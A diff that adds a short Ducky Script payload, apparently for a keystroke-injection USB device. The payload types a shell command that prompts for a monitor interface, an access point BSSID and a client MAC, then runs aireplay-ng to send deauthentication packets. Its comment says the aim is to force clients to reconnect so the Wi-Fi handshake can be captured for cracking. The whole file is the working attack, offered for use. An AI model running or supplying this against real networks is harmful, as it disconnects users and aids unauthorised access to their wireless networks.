@@ -1,0 +1,4 @@
+REM Send deauth packets to force a client to reconnect (triggers handshake capture)
+DELAY 500
+STRING read -p "Monitor interface (e.g. wlan0mon): " i; read -p "AP BSSID: " bssid; read -p "Client MAC (or FF:FF:FF:FF:FF:FF for all): " client; sudo aireplay-ng --deauth 10 -a "$bssid" -c "$client" "$i"
+ENTER
